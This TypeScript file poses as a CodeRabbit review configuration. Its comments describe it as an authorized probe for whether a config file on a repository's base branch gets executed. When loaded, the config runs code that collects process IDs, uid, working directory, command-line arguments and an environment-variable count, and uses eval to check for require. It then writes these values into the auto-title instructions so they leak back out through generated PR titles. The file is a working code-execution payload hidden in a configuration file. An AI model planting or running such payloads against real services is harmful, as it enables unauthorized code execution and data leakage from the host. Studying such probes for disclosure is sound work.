// CodeRabbit config-execution probe CR-BASE-121 (authorized VDP research, READ-ONLY marker).
// Placed on the BASE branch (main) of aikido-bb-lmacan2/cr-public-pr-surface.
// Purpose: the control the previous worker could not run — does a .coderabbit.config.ts that
// lives on the BASE branch of the repository also execute? The payload emits a runtime
// computation (pid/uid/cwd/node version/env count) so a positive is provable execution and not
// merely the presence of the file. READ ONLY: nothing is written, deleted or modified.

const MARK = "CR-BASE-121-EXEC"

function rep(): string {
  const R: string[] = []
  try {
    const p: any = (globalThis as any).process
    R.push("pid=" + p.pid + " ppid=" + p.ppid + " uid=" + p.getuid() + " cwd=" + p.cwd() + " node=" + p.version + " argv=" + JSON.stringify(p.argv))
  } catch (e: any) {
    R.push("proc!x=" + (e && (e.code || e.name) ? String(e.code || e.name) : "ERR"))
  }
  try {
    R.push("nenv=" + Object.keys((globalThis as any).process.env).length)
  } catch (_) {
    R.push("nenv=ERR")
  }
  try {
    R.push("modscope_require=" + eval("typeof require"))
  } catch (_) {
    R.push("modscope_require=ERR")
  }
  return MARK + " :: " + R.join(" || ")
}

export default {
  reviews: {
    profile: "chill",
    auto_title_instructions: rep(),
  },
}
